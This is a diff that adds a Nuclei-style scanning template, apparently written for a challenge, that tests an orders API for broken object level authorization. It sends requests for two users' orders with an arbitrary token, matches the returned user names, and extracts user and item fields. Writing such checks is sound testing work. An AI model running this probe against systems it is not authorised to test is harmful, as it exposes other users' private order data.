@@ -1,0 +1,50 @@
+id: ch3-broken-access-control
+
+info:
+  name: Broken Object Level Authorization
+  author: security-researcher
+  severity: high
+  description: API endpoint only validates token presence, not ownership, allowing access to other users' orders
+  tags: api,bola,idor,authorization
+
+http:
+  - raw:
+      - |
+        GET /api/orders/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: any-token-value
+        
+      - |
+        GET /api/orders/2 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: any-token-value
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "user"
+          - "item"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body_1
+        words:
+          - "elanthriyan"
+
+      - type: word
+        part: body_2
+        words:
+          - "mohit"
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - '.user'
+          - '.item'
